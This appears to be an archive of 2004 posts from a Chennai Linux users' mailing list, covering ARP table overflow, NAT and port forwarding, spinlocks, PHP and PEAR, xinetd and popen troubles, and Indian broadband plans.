I hope, this message from some Kernel Modules. You can redirect this 
message to log file by changing the level of  log messages.

Read man dmesg [option -n]

Greets!

This is because the arp table in your machine is overflowing.

Usually happens when there is a widows machine on your network with some cool 
port scannig worms... :)

This should usually not cause any problems... but sometimes, you cannot 
connect to legitimate machines on the network because there is no space left 
in your arp tables for a MAC address look-up.

Greets!

Yesterday, I installed debian sid from the ftp.iitm.ac.in mirror. I stay in 
the hostel and can get 10MB/s access to it. 

There were a few problems though... some packages have missing files eg: xfig, 
transfig, hdparm, libgc.. The complete hdparm directory is missing.

And... does "base-config new" (run at first boot) allow me to change the proxy 
setting if I make a mistake entering it the first time? That is, I put in a 
wrong proxy which works but is slow... and later it never let me change it. 
Was pretty frustrating... ended up installing stuff manually using apt-get.

When I was in chennai I used to use iitm mirror and it was faster than

ftp.us so I dont  know what state it is in. However,  are you sure you

You can simply setup the http_proxy environment variable, like:

export http_proxy='proxy.whatever.your.domain:<port>' (of course, port
is optional).

No upgrade... I'm installing. :)

And yes... when I did  it manually later, I did do a apt-get update.

I also ftp'd to the mirror and verified that the files apt-get was trying to 
fetch were missing. 

I then used the mirrors.kernel.org mirror to get them.

Maybe the person incharge of the mirror should fix this?

I cannot do this at first boot when "base-config new" is run automatically. I 
did do this when I manually completed the install later.

Are you using kde with the arts sound system enabled?

If so, try setting xmms outout to use arts instead of OSS.

Are you using kde with the arts sound system enabled?

If so, try setting xmms outout to use arts instead of OSS.

IIRC, the IITM archives used to be updated each night.  Prof. Sriram

Normally "Neighbour table overflow" error occurs when your kernel has 
support for loopback but it is not configured. Try running 
'/sbin/ifconfig'. It should list something like the following.

eth0      Link encap:Ethernet  HWaddr 00:XX:XX:XX:XX:XX

Note that 'lo' is configured here. If you don't see 'lo' listed, then 
this is the one which causes the problem. To get rid of it, try doing 
'/sbin/ifconfig lo 127.0.0.1'. Note that you must be 'root' to do this.

Is this even possible under normal circumstances? I've never ever seen a 
system which did not have lo up and running. 

But, I've seen this error a lot when there is heavy portscan traffic on the 
network.

I came across this problem in my Debian Woody box two years ago. The 
reason was that 'lo' was not up. See some pointers below.

I don't deny that there may be other problems that causes this one. Some

Strange... :) But interesting. I do not think this would be the problem with 
Mandrake 9.2 though. No idea...

I noticed this problem with Mandrake 10 and the lisa-daemon which scans for 
windows shares on your local network. It was generating so many arp requests 
that these messages appeared even at first boot.

I've seen a lot of these messages on the firewalls here everytime a new 
Windows/Outlook worm comes along.

Typical  questions can range  from testing  your understanding  of the
unix system  (pipes, processes, shell,  etc.,.) to setting  up various
services  (again  may  start  from  the  basics  -  inetd  and  go  to
configuring mail, http, etc.,.)

As such you should be able  to find online quizzes and such. However I
strongly recommend learning things by practice.

Basically the NZ OSS society tests the hardware for linux compatibility
and if it works, the vendor gets to put a "Linux Friendly" logo on the

Does this kind of scheme have a chance to take off in India? Any thoughts?
Personally I think this is a nice way to make money and promote linux at

Hi

I use fedora core 1 and use vsftpd. Really easy one. I think that should 
be there in RH 9 also. TFTP is not advisable. It has a very different 
purpose.

Hi

Are you talking about proxy servers. Then use IPTABLES. Its available 
from linux kernel 2.4 onwards.

I am wondering how a system on the Internet (external world) can place a 
request to a private IP address (10.x.x.x)! Do you have a bidirectional 
NAT in the middle so that your local machine can be referred from the 
external world?

Use http redirect to ask the client to connect to a different port on the

With HTTP Redirect, the client should be able to access the machine to
which redirection is done. In this  case, the redirection is done to a
10.x (internal IP) machine which is NOT in the Internet.

With port  forwarding, the  firewall will be  able to  seamlessly send
data from the external network to the internal network and vice versa.

I think the problem is that what internal host the client needs to connect 
to will be decided based on the link the user clicks in his/her browser.

You cannot do it at the firewall in this case I think. Especially if you 
have multiple internal 10.x.x.x hosts that are being used.

no no... to  the client it will still seem like  its connecting to the
external  machine.   However, the  external  machine  wont handle  the
request, it will simply forward the  request (at the TCP level) to the
10.x machine. and similarly the response  from the 10.x will go to the
external machine and _then_ to the  client (so yes, this also needs to
be  setup  while doing  port  forwarding).  If  you  read  up on  port
forwarding all of this will be clear to you :)

I do understand what port forwarding is. :)

external machine runs the webserver. And a link in a doc there points to a 
doc on another machine that has a 10.x.x.x IP. This is the problem right? 
:)

I do not think the initial poster had round robin port forwarding in mind. 
Maybe he can clarify.

If I get your correct, I think what you talk about is a bi-directional NAT.

Assume, I am 61.11.75.244 and I want the to access a machine 10.1.1.1, I 
should have a bi-directional NAT say 168.192.1.1 having port 40000 
mapped to 10.1.1.1's port 80; now 61.11.75.244 should say the 
destination IP address as 168.192.1.1 and destination port as 40000 to 
reach 10.1.1.1.

What I asked in the previous question was that how could you say 
destination IP address as 10.x.x.x in a IP packet which is going to be 
routed in a public network?

yes bi-directional NAT is what needs to be done.

Message-ID: <Pine.LNX.4.58.0406011051040.22096@chi.spunge.org>

Hi,
Can anyone who knows well explain with example
of what is spinlock?

I googled and went through some of the docs
which I could get. But I am not clear with them.

Something like the following it says.

spinlock like a semaphore but has no process list. And when
a process finds a lock closed by another process, its "spins"
around repeatedly, executing a tight instruction loop until the lock
becomes open.

I dont especially understand what is spinning and executing a
right instruction loop.

An explanation and perhaps a small example or algorithmic code
would be very helpful.

Thanks
carti

         This never happens. A timeout is normally provided for entries in the ARP cache. Normally we hav a timeout of 20 minutes for a completed entry and 3 minutes for an incomplete entry. Also, the 20 min timeout will get restarted for an entry each time it gets used up. So whenever a new Internet add to mac address mapping happens, then, this new entry will replace the oldest entry present there in the arp cache. So I assure u, that the arp table never overflows. 
 Ok, how does neighbour table relates to arp tables ?
In ur network (which u specified in ur previous mail), try arp -a and verify the entries.

>From Montreal, Canada, hi to Chennai.

Having seen many Mac stickers on car's bumber, I thought that I could, me
too, show what my colors are on my car.

I searched on the internet to find a Tux sticker, this sympathetic
antarctic animal. I was amazed and a bit sad when I discovered that I 
can not find one. I then told myself: I will do one!

My car is right now with a beautiful Tux sticker and everyone knows what
my OS is. And I am proud to tell that I can offer it to all the community

Exactly. When you get 2000+ new entries per second and  have a 20 minute 
timeout, just see what will happen. All legit entries are old entries! And 
it does overflow, and old entries are flushed.

-  Ok, how does neighbour table relates to arp tables ?

I thought neighbour tables == arp tables? Not so? From what I read I think 
they are the same. I might be totally wrong... so correct me .. :)

- In ur network (which u specified in ur previous mail), try arp -a and verify the entries.

This  behaviour is rampant in the IITM campus backbone. Frequent outages 
because of this specific problem.
   
Quoting from one of the links posted previously, 

-------

   Normally, the kernel maintains an internal cache which maps IP 
addresses to hardware addresses on the local network, so that 
Ethernet/Token Ring/ etc. frames are sent to the proper address on the 
physical networking layer. For small networks having a few hundred 
directly connected hosts or less, keeping this address resolution (ARP) 
cache inside the kernel works well. However, maintaining an internal ARP 
cache does not work well for very large switched networks, and will use a 
lot of kernel memory if TCP/IP connections are made to many machines on 
the network.

   If you say Y here, the kernel's internal ARP cache will never grow to 
more than 256 entries (the oldest entries are expired in a LIFO manner) 
and communication will be attempted with the user space ARP daemon arpd. 
Arpd then answers the address resolution request either from its own cache 
or by asking the net.

My setup is,

       Internet ---------> Machine A --------- Machine B
                         (has global-IP)      (has local IP, 10.x.x.x)
                          dns.domain.com          
			  host1.domain.com


Machine A -> running HTTP for domain.com, host1.domain.com 
Machine B -> running HTTP 

(web contents for host1.domain.com are uploaded in 10.x.x.x)

The people from Internet should able to browse the web contents of
Machin-B (ie URL : http://host1.domain.com).

Yes, I can try with bi-directional NAT. 

Can it be done via VirtualHost, RedirectPermanent from the Machine-A
httpd.conf.??

You cannot redirect an external machine to a 10.x.x.x address without port 
forwarding. If you use RedirectPermanent, the external client will try to 
connect to the 10.x.x.x address.

You will have to use redirect permanent to redirect the external client to 
a different port on Machine A. And then map that port to port 80 on 
10.x.x.x.

Deepak

Hi this kind of programs are there lot in
International   C code contest There very much
comlicated 'c' codes are  there this newsgroup deals
with the linu stuff So now I  may not give you the
explanation but If you want the explanation for the
specific purpose you contact me in my personal yahoo
id so that I can give you the explanation But this are
all certified programs to show  that we can play by
using the ascii characters by using 'c' langauage
byeee

Hello,

	I have configured a dial up connection using network
configuration tool in Fedora Core 2. But KPPP is not
listing that connection. How to add it in KPPP.

	Also I have created a  new dial up connection in
KPPP. I have also added the DNS in /etc/resolv.conf.
Primary & secondary dns have also been added in KPPP.
But after connectin in this connection, browser takes
long time to resolve a site address. How to solve this
problem.

	Note: The connection created with network config tool
does not have this problem

Create alias in module.conf file OR manually load it.

Still many people find very difficult to identify whether particular 
device will work with Linux OR not? Suppose if device comes with 
"Linux Logo" then it is very easy select and reduce the confusions.

Yes, this the best way to promote the Linux.

Generally, an `addon'  is an independent and separate  work in itself,
and  therefore, if  you  modify and  redistribute  a separate  `addon'
computer  program released  under  the GPL,  you  should release  your
modified version  of the separate `addon' computer  program along with
the source code under the GPL, to avoid violating the GPL.

Though it may not be needed  in your case, disclosing the whole source
code  is good practice,  and doing  so under  the GPL  or a  like free
license would be a lot better.

I will assume that all  software developers can write very complex and
highly useful code, but how do you value the money worth of your code?
By counting  the number  of lines, bytes,  hours spent, or  by judging
utility and demand?  Exactly, how  much bread and butter do you expect
for  your  code?   GPL gives  a  tidy  solution  that makes  the  code
priceless  and  invaluable  for  all,  allows  collective  pooling  of
resources  making  it  possible for  all  to  use  and earn  from  the
collective work.

Take  the PHP  project  - there  are  800-900 people  round the  globe
contributing, with  more than half of them  writing the documentation.
The core  is maintained  by just 9  people.  Ramsus Ledorf  has worked
with Bell and  IBM, RedHat gave enough stock to buy  a car, and Ledorf
is now with Yahoo. Most of the 900 people are employed by companies or
universities that  inturn get to use  not only the  collective work of
several  hundred people  but the  collective stock  of  free software.
This is  a familiar  pattern in many  of the successful  free software
projects.  Brian  said at an ILUGC  meet that they  have even directly
paid employees working on subversion.

This is so much like natural  life[1], with a continuous flow of code,
feedback  and resources  between users,  developers  and distributors.
The free software movement has provided a framework for a free society
based  on free economy  and there  are no  reasons to  call commercial
people,  who   also  undertake  development   efforts,  as  parasites.
Darwin's `survival  of the fittest' is  most visibly seen  in the free
software community.   The `bread  and butter' would  come only  if one
takes care to figure out where  he fits in this framework.  If one had
studied key source  code and felt `what lousy code -  I can do better'
then even  if one had  to live  life as a  last grade Onyx  worker, he
would still find a way to  contribute code and make his presence felt.
If  one  feels that  distributors  are  making  more money  than  they
deserve, he can start competing  with them.  Users can help themselves
and  also others  by bringing  in others  into the  framework, sending
feedback or  with other contributions.   With daily builds,  the whole
process  is highly  dynamic  offering never  ending opportunities  for
those  who act  in time  in a  fitting way  to make  their  `bread and
butter'.

Regards,
Ramanraj.

[1]  `the  hidden  connections'  by fritjof  capra  [Harper  Collins],
analyses the  recent findings in microbiology, and  the author extends
the framework found at cellular  level to the social domain.  The free
software web of life very much  looks like the way Life [that includes
DNA code]  appears to evolve  naturally. Reading the whole  book might
help to see the hidden connections better :)

Hi Raman,
     I had already tried giving the full path for the ps, cut etc. but it was not working. My suspicion is that is there any parameter that needs to be set in the conf file for thi service that will enable the successful execution of popen otr system by the application when it is executed via xinetd. Why I am saying this is that the same application works perfectly well when executed as standalone, but fails when executed via xinetd. 
 
Any help would be appreciated

try giving full path name of the commands like /bin/ps instead of ps.

Hey,

I have the same problem too.

If I'm guessing right then u have continuous play in XMMS. Have you also
enabled sound alerts in GNOME?

Or are you running Gaim,Yahoo Messenger with Sound Alerts.

What happens is the sound alerts get buffered and when a song ends in
XMMS, the sound alerts get played (new mail,buddy in Gaim). At this
point XMMS wants to play the new song queued in the playlist.

As the sound device is busy with the alerts, it gets displayed that "No
sound device present/ Select the right output plugin".

Unlike Windows, which enables two different sound programs to make use
of the sound card, Linux *i think* performs a hardware lock on the sound
device and enables just one device to use it.It however queues and sound
files to be played which get played after the device becomes "free".

Just turn  off any sound alerts you have, and the problem will go away.

Bye,
Toufeeq

Not really. Through ESD or ARTS, multiple programs can produce their 
audio output on the sound card. Note that all the programs should use 
the same plugin. I can run as many instances of XMMS playing different 
songs to produce a choatic output without any problem.

I tried watching a DVD using xine while xmms playing a song. There was 
absolutely no problem. FYI, I was using ESD.

 Deepak, as you said, 
         Neighbour table == arp cache.
 I think that its mostly because of "wrong lo setup"
or "a wrong address mask". 

 So first verify that all the entries in ur network
configuration are correct.
 Garbage collector is scheduled to remove the old
entries in arp cache. What if in a congested network,
the max no. of entries is 200 or so, and garbage
collector is scheduled once in 10 or 20 min. Surely,
the arp cache wud overflow (as u said).
 So, the second thing that u must try is, increase the
no. of entries after which the garbage collector must
run.

Hi

I am running samba as a PDC in our company. We use Fedora Core 1.
At present we are using passed unix flat file. This is because if i am 
right you need to recompile samba with mysql support. Just confirm it. I 
may be wrong.

Note that he wants to connect to a server and he is not running the 
server. How can he enforce to use vsftp on the server which is 
administered by someone else?

Hi

--------- I tried to ftp another server in my network

Those were the wording he used. So it means that he is using his own 
network.

In case he is not the admin then he will have to make certain that he is 
  registered in the kerberos database inorder to login as a client. So 
call the admin now and create a database entry for kerberos.

If your card supports hardware mixing and it works with your driver, then
it is best not to run any of these daemons. They have a lot of problems
both in design and implementation. Great quote from Alan Cox: 
  "I don't know why and I'm not yet motivated to fix it since my views
  on esd are mostly unprintable."

Hi all,

PEAR seems to be a very promising technology, when it comes to Rapid
Application Development. It brings the pure object oriented design to the
application. But Why is that not many popular open source PHP projects are
not implemented using PEAR.

To put it in other words, does using PEAR in application really slows down
the program execution time. Or are there any major issues on using php-pear
in a php-project. I would like to views of the people in the groups
regarding this.

with regards,

Tell me something, how many people  write OOP code in PHP in the first
place?

Even really  "pro" application  developers would tend  to write  a PHP
extension (in C++)  which is all proper OOP and then  simply use it in
PHP (ie.,.  the  extension will give a C++ based  OOP interface to the
PHP layer). PHP can be a very good "bridge" between a real application
(C++ based PHP module) and  the web server.  Writing everything in PHP
is an overkill. Others' views may differ, though.

Hi,

  To me PEAR looks more promising.  The amount of coding which is 
getting reduced is
pretty good.  But once again people have to explore this options and use 
them.  Most of the
time there are ready made solutions on the Internet so people generally 
use them rather than
exploring PEAR.

  Have a great day.

Hi Jayakumar,
  Thanks for replying.
 
  This should not be a problem, because the code retrieves the username from a tag in the xml message that is contained in the body of the http request and does the ps --User for this username. It searches if the particular process is running for this username retrieved from the message. As I have said, the read from the pipe opened to the command fails (when the process is run via xinetd) i.e., returns zero bytes as if the particular process is not running for the user. However, when run as standalone, the read succeeds and we are able to correctly determine if the particular process is already running for the username. The same scenario occurs when I try use system() instead of popen. In this case also the return value from the system() call is misleading when run via xinetd but is correct when run as standalone.
 
   My guess is there may be some parameter that we need to set properly in the xinetd.conf file against this service(which is running our application) which will enable the popen() or system() to correctly work. If I could get any help in this angle that is also welcome

Hi

I suppose that when u invoke a process thro' xinetd or
other daemons the process is not owned by the user.
hence when u give the ps --User command ur process
wont get listed. try using ps -ax instead of ps
--User.

Thanks

Karthick:

I agree that PEAR is very good when it comes to RAD.  You can quickly
write portable code (look at the DB module) using that.  But when your
web site receives millions of hits, writing everything in PHP might not
be the way to go about it.  Worst case is when everything is written in
OOP paradigm in PHP.  It really slows down.  So, people tend to write
extensions in C/C++ that can be used when you really need classes and
objects -- OOP style.

If you're interested, have a look at SWIG, that will allow you to write
PHP extensions in C, C++ very easily.

When you want to use OOP paradigm in PHP, move it down the layer, write
it in C, C++.

Hi all,

     I have been getting the following error in the popen() call when I execute my appliaction via xinetd:-

           sh: xmalloc: cannot allocate 3 bytes (0 bytes allocated) 

However the FILE* returned by popen is not null and my program proceeds. However, the above error suggests there is some memory allocation problem when the application is run via xinetd. This error does not occur when executed as standalone application

If u have any idea abt the cause of the above error and the way to rectify it please share it ASAP.

rgds,

Prashanth

Hi,

 What you say is absolutely right.  But the problem is this will remove 
the simplicity of PHP for
which it is so famous.  I am just hoping that Zend Engine 2  is 
optimized for OO features.  In that
way we don't have to rely on extensions.

 Have a great day.

Rasmus gave a  tech talk in bangalore and when I  asked when PHP would
have OO  features, he said that  PHP (actually yPHP, but  then some of
the main code from Yahoo! PHP also goes into the open source PHP code)
aims at being only an interface between the presentation layer and the
processing and that  OO can easily be done using  C++.  True, but then
not everybody can / would want to write C++ code for say, a simple PHP
application.

cheers,

Suraj is absolutely correct here, not everybody would want to write in
C/C++.  And the point I'm trying to say is for only *performance
critical* things you would go down the layer to C/C++.  For simple web
sites, it would actually be a waste of development effort.  You could
use tools like APD (a profiler for PHP) to study where PHP spends time
and try to rewrite it using a better algorithm or in C.

APD is available from http://pecl.php.net/

And I believe that the DB layer in PEAR is going to be rewritten as an
extension in C/C++.

in your hosts file, yes

if that has a dns record (A record in the stjosephs.com domain) 
associated with it, also in your bind zonefile

resolv.conf has the ips of your resolving nameservers (that you use for 
dns lookups)

Spinlock (aka busy lock) is when a thread repeatedly tests for a
condition.  Eg.  Look at the following C code -

 1. while (lock == 1) continue;     /* tight loop */
 2. lock = 1;
 3. /* critical section goes here */
 4. lock = 0;

When executing this code the thread waits for some other thread to
set lock to zero.  When lock is zero, the thread enters the critical
section.

A tight loop is a loop with a very small body.  Spinning is the slang
for repeatedly executing a tight loop that effectively does nothing
(like line 1 above).

Note: a race condition exists between lines 1,2.  There exists the
possibility that more than one thread can enter the critical section at
the same time.  This is because, the "test" to check "lock == 0" and the
"set" "lock = 1" operations are not atomic.  Atomic test-and-set support
from the hardware helps in preventing this.  See the 'membar' (memory
barrier) instruction on Alpha architectures for how atomic test-and-set
is implemented in hardware.

Spinlocks have the following features -
  1. eats CPU - you are constantly checking lock status
  2. you cannot hold this lock for long without degrading performance 
     the rule of thumb goes that spinlocks are fine upto 150 iterations
     of your (while) loop.
  3. on a lot of CPU architectures (esp ones that implement atomic
     test-and-set instructions), spinlocks are cheap to create.
  4. can be implemented without kernel support


Semaphores are different in that while waiting to obtain a lock, a
thread is 'put to sleep' and does not consume any CPU cycles.  The
thread is woken up (by the kernel or the threading library) when the
lock becomes available.  Creating/using semaphores is expensive because
the kernel/threading library has to setup/maintain some internal data
structures, so its best to use them in cases where you have to wait a
long time to obtain a lock.

HTH,

- Raja

Message-ID: <20040603140139.4855.qmail@web10907.mail.yahoo.com>

hi,

i used to download files at maximum speed possible
(dialup). but this gives slow browsing experience when
downloading files.  

is there any way for recognizing the HTTP get request
(to be sent) and automatically stepping down the
download speed , so that we get smoother and optimal
performance. 

most of the time we're just reading the website -- so
the download manager can increase the download speed
to maximum at that time.

any download manager does this?

note: axel is better than wget, bcoz axel utilizes
bandwidth, but wget is better in other aspects.

Hi

At last i see some discussion on php. I thought ilug is all about java 
and c. Guys php is a good lang. Now with php5 its going to be better. 
For your info take a look at www.mojavi.org. This is a application 
framework for future php applications. Its base on the now famous MVC 
(Model View Controller) philosophy. Basically it means, it resembles 
Java struts.

If you want really fast RAD and dare to venture in OOP and call back 
functions the this is yours. And with PEAR support its a cakewalk for 
major app. development. Dont get me wrong, its not worth the money to 
strain writing extension in c, or c++ for even big apps. Now a days its 
all fast development. Latency is OK. Ask for a better server.

Happy Mojavi

You can use the pdftotext tool that comes with xpdf to convert the pdf files to text. But the resulting text files are a bit ugly. Another way to solve the problem is to use ghostscript to convert the pdf file to images and then view the image files using zgv(a svgalib based program). "gs --help" will give more details.

This is like encouraging poorly written algorithms.  Premature
optimization is the root of all evil.  IMO applications must be tuned to
the maximum possible before demanding for more/better servers.

Hi

I did not mean that. What i meant is optimising on cost of project. You 
can sit for hours together to bring a fine application. But by the time 
your customer may have moved to other suppliers. I was looking it from a 
business perspective. From a engineering point of view i agree with your 
point.

  Network monitoring is a huge subject. SNMP is the underlying protocol. 
  SNMP agent should be running in the network device. All the routers,
  SNMP capable switches will be running snmp agent. Linux, Unix you have
  net-snmp and for win built in snmp agent will be available.

  You need to install nagios and configure it to poll the agents.

Zabbix is another php based tool for network monitoring.

What events are conducted in the festival? Sorry, if
this question has been asked earlier, I am new to the
LDD/installfest. There will be a discussion on this in
this month's meeting on June 12, 2004?

I will be happy to help in any possible way,

Thanks,

Greetings!

Is anyone using the BSNL digital modem connection? The
details:

- Registration (Rs.2000/-)

- Connection is like this:
Internet<--Telephone line-->Modem<--Ethernet-->PC
(Since its ethernet I can use it with any OS?)

- Speed is 128 KBps (kilo bytes) with download/upload
limit of 512 MB/month at cost of Rs.850/- per month.

Let me know your views,

Thanks,

   That's great, but is it always connected or do I
have to connect/disconnect like dialup.  There is
something called DIAS which has data limit of 500
MB/month with the same Rs. 859 per month.  Dunno
what's the advantages between the two.

  Now I am using BSNL's permanent telephone line (2nd
bfone) for internet.

  I have even started a `emerge sync` in that dialup
-- probabily it'll finish in the morning :)

Hello all,

Here's an interesting software for Desktop Users who
are fed up with redhat-network config .

Also GNOME loyalists who were forced to use KPPP cause
they had no other choice, here's something for you...

http://www.gnome-ppp.org

Its a GNOME2-based dialer similar to KPPP.Currently
its in beta stage and Vladimir, the developer of
GNOME-PPP wants people for bug-testing.

It currently runs well without crashes but needs root
access cause it uses the default /etc/wvdial.conf file
for the configuration setup.

It should make its debut in GNOME 2.8 or the 2.7 dev
version.

Have fun,
Toufeeq

BSNL:

Yes, it is the same DIAS. The digital modem has one
RJ-11 (telephone line), and one RJ-45 (ethernet) that
goes to the PC. It is a 24/7 net connection (not
dialup). The tariff sheet says "128 KBPS" (printing
mistake?) but the website says 128 kbps:

Direct Internet Access Service (DIAS)
http://www.bsnl.co.in/service/dias.htm

I guess it is 128 kbps. Rs.2,000/- for initial
registration, Rs.850/- per month at 16 KB/sec (or 128
kbps) with 512 MB download/upload limit per month is
decent enough. If you overshoot the limit, you pay
Rs.120/- per 100 MB. But, seems they are working on
slabs so the amount that will be charged extra will be
proportional to the amount of MB you overshoot.

Touchtel:

Touchtel (Zyxel USB modem - only windoze driver) has
reduced its registration from Rs.10,000 to Rs. 3,000
for the router package. The router of course, costs
Rs. 6,000. The package plan cost is separate from the
Rs.9,000 :( 

I feel BSNL is reasonable at the moment,

hello,

  I find this conenction a little safe. But my better
alternative is a Hutch internet. You can connect o
internet thro your GPRS mobile. Its Rs. 500 a month
and download and upload is unlimited.

 Speeds a little better than the dialup connection...

 So jus chk tat out.

I remeber a utility on Debian 'bmv' which is capable of displaying 
postscript (PS) files in text mode. This uses SVGA lib. I am not sure 
whether it can show up PDF files.

siliconindia staff writer Friday, June 04, 2004 

CHENNAI: Red Hat India, Linux and open source solutions provider, is 
to set up a sales and support office in Chennai in the next four 
months. 

Sachin Dabir, head-enterprise sales, Red Hat India said, it was a 
part of the company's plans to expand the southern market. He said 
government, banking, telecom and public sector units would drive the 
demand for Linux and open source software applications. 

Dabir said, while the government and public sector units provided the 
initial thrust, increasingly private sector companies have started 
looking at Linux-based applications.

Manoj,

I just now noted that your mail is sent to ilugc@aero.iitm.ac.in and 
CCed to ilugc@ae.iitm.ac.in. So, whenever someone do reply all two 
instances of their mails reach at ILUGC's list. I have seen this with a 
lot of mails.

Avoid using both IDs and use any one and this will avoid wastage of some 
storage space on the server by archiving the duplicate mails.

Praveen.

Hi

There is another way. The WISIWIG way. Use Abiword to open the document 
you wish to convert. Then go to Print command. Then on the printer 
combobox click on Create a PDF Document. That's it. Work done.

  Yes.  But I dont' think that is what I want. 
Trickle just limits the bandwidth consumption of
programs, but I don't how that manages `dynamic
bandwidth adjustment` in case of high priority (short
time) requests, such has getting a html file, over low
priority (long time) stuffs like downloading files.

>From trickle man page::
     -u rate      Limit the upload bandwidth
consumption to rate KB/s.

     -d rate      Limit the download bandwidth
consumption to rate KB/s.

     -w size      Set peak detection window size to
size KB.  This determines how aggressive trickle is at
eliminating bandwidth consumption peaks.  Lower values
will be more aggressive, but may also result in over
shaping.  The default value (512 KB) is usually
sufficient.
::

I don't know what's the difference between -d/-u and
-w.  Will not the -d/-u takes care of that (-w)?

Yes. It is possible. But you have build ur "OWN" interface card and 
software for this purpose. The following I/F card diagram will give 
some idea.

Your S/w PC NIC <===> NIC i/f <--> MicroController <--> HDD

The NIC at ur i/f card will have some MAC id. From ur PC, u send data 
to that NIC. The micro controller will receive it and store in the 
HDD. Handling FS at the sotware side will reduce the ASM programming.

Bye :)

Read the sendmail faq at http://www.sendmail.org/faq/ - relaying denied 
is one of the top 5 faqs.

  Try webhttrack which gives a GUI interface for
httrack. Webhttrack is very similar to Winhttrack for
windows (I mean the engine behind these two) and it
works very well.
http://www.httrack.com/page/2/en/index.html.
Also khttrack and ghttrack are available.

For the BSNL connection, the network setup is like

Can I directly use DHCP in the ethernet connection on

UNESCO's IIEP Organizes Virtual Forum on Free and Open Source Software 
for E-Learning 25-05-2004 (UNESCO)

An internet discussion on "Virtual Forum on Free and Open Source 
Software" (FOSS) is being organized by the International Institute for 
Educational Planning (IIEP) in response to the interest expressed 
during the first discussion forum Virtual universities and e-learning 
Policy issues &#8211; What are they? and Whose are they? associated 
with the IIEP study on the virtual university and e-learning.

At the conclusion of the first forum in February 2004, many 
participants asked IIEP to maintain its support for the community 
built around the topic of e-learning. The objective of this second 
forum is to support information exchange and reflection upon the 
potential of free and open source software for e-learning and to 
consider the pros and cons and its applicability for developing 
countries.

The forum will take place from 1-25 June 2004 and will be organized in 
two sessions.

* Session 1 (1-11 June):

   FOSS: what is it and what should you know about it?
   FOSS for e-learning: what are the pros and cons?

* Session 2 (14-25 June):

   FOSS solutions for e-learning

It will be generally moderated by Susan D&#8217;Antoni, the editor of 
the IIEP study on the virtual university, with input from the members 
of the informal organizing group for the forum:

Tony Bailetti (Carleton University, Canada)
Jean Claude Dauphin (UNESCO)
Ross Gardler (University of the West Indies)
Stafano Mazzocchi (Apache Software Foundation)
Paul West (Commonwealth of Learning).

The format will be informal with an open exchange of information among 
participants. However, in addition to the informed input from the 
organizing group, some experts have been invited to share their 
experience and ideas.

Participants will be given a brief document introducing the forum, 
with several suggested general background documents.

The discussion and debate will be summarized in a report that will be 
made available to all the participants as documentation on the issues 
and concerns related to the potential of FOSS for e-learning.

To join the forum, you can send an e-mail message to: 
virtual.university@iiep.unesco.org

Subject: [Ilugc] partition problems
Message-ID: <20040610014138.12580.qmail@web10903.mail.yahoo.com>

When I start GNU parted, it says some warning.
See this file for more info

--OUTPUT--
http://cs.annauniv.edu/~rsridhar/pub/partinfo.txt
(Do a `cat` for proper display)
--OUTPUT--

Why is Linux wrongly detecting the geometry?  Also in
the recent days (slackware and gentoo) I get a
different layout in `cfdisk /dev/hda`.  Between each
successive partition cfdisk (or fdisk) shows some free
space left (small negligible size). I'm not sure why,
bcoz when I created the partitions last I didn't left
any free space.  Is this the symtom of wrong geometry
detection by Linux?

Or should I append the hdx=xxx args to kernel as
`parted` complains?  But I didn't had this problem
before (Not h/w change too).

Any suggestions?

Hi,
  I need some help on postscript printer description file entries in Linux. I have a troff script that is used to perform tray switching on a postscript printer. It passes some low-level commands to the postscript printer to do the tray switching, but this is not working correctly. 
 
I would appreciate if I can get some info on the setpagedevice command.I would also like to get some sample code that does tray switching for a post script printer.
 
Thanks,
Prashanth

Hi,
I need a favour related to linux from the
following person.

I dont know his actual name. His nick name
is DOSAI. I guess his real name must be
manoj(Got from the old mails of ilugc
through  chennailug website).

He is one of those who  took active part
in the previous Linux Demo Day in MIT campus.

If anyone could gives his active mail-id(s),
it will be of great help.

Thanks and regards,
carti

Interesting, but  I see a grayscale version  of a hat on  the top left

There is a "hazy" explanation of  why its "okay" for redhat to call it
"fedora":

Dear GNU/Linux users,
I have printed copies of the book "Free Software, Free Society - Selected Essays of Richard Stallman." You will find an online version of this book at http://notabug.com/2002/rms-essays.pdf. I will be bringing the books to the meeting. The cost of the book is Rs. 80. Those who are interested please bring in the cash.

Vijay

Hi,
            Try using "fdisk". Type "m" for help on commands in the
fdisk prompt. Use 'n' to create a new partition.
            After you finish making the partition say "hda2", Use mount
/dev/hda2 /oracle
            
Hope that helps,
Prashanth Ellina

Hi,
Forgot to mention something. 
 
In case you do not have unpartitioned space on the disk you can try this
-->
But beware it did get me into trouble the last time I tried doing it
while watching Vivek comedy on tv!
 
We assume that u have more than 3 gb space and that ur partition isn't
fragmented (much).
 
1)     Delete the partition
2)     Add the same partition but with a smaller size
3)     Add the 3gb partition that u want for oracle
 
But, see if u can do it another way ( I DO NOT LIKE MESSING WITH DISK
PARTITIONS! :-) )

Message-ID: <40CB4068.9070300@sancharnet.in>

Dear All,
This is not related to Linux, but i need your help.
For our school , we need few wire-less sets.

we needed it for the following purpose

1) During school functions , to communicate between working team. [ 
around 100 major events/ celebrations / functions in a year ]

2) During Trekking at Yercaud hills, to communicate between different 
groups of our trekking students. [ 700 to 900 students ]

3) During 10 K.M road race

4) During School Science Exhibition

5) During School Sports Day

6) During Mega Cultural Event

7) Any other type of communication in side the campus. [ eventhough we 
have intercom fecilities ]

we have licensed Antena , erected for HAM Radio club for a fixed set [ 
we do not have any working wireless handset ]

1) we need atleast 10 sets
2) it can have  one to many, many to one , many to many options.
3) The range should not be less than 500 m.


more over, if it is one way only [ ie, one to many ] , is it possibe to 
use any simple FM receiver ? if so, HOW ?

i think Motorolo is having a costly solution [ Rs. 8000 /- and Rs. 4000 /- ]

kindly help me to solve this

have a nice day

If you read the comments on /., its clear that this
survey was really dumb. The set of tasks chosen was
a very small part of what a scripting language can be
used for and were heavily geared towards file management/
system administration, so the results shouldn't surprise
anyone. It is quite meaningless to proclaim one lanaguage
as the 'winner' because no language can be well-suited
for all applications.

Completely agree. Hence I said "seems" like... I just wanted to see if
this  can become  a  healthy  thread where  finally  Asokan would  say

That survey is better than most others that are really dumb for being 
based on mere polls.  The survey at /.  makes comparisons giving reasons 
and looks like an attempt to do intelligent comparative analysis of 
scripting tools.    At present, the most routine dumb tasks are 
delegated to scripts and computer programs, and when the programs get 
smart, there won't be much of a future for programmers.  Until then, 
keeping a tab on these surveys could help users or non-professionals to 
set their priorities.  Besides, I do hope some experts can improve those 
comparative tables, making them more exhaustive, which could lead to 
scripts that enable translation of scripts from one language to another 
wherever possible and needed.

In general, modems have both USB and Ethernet ports
and you can connect to either end. Some have only USB
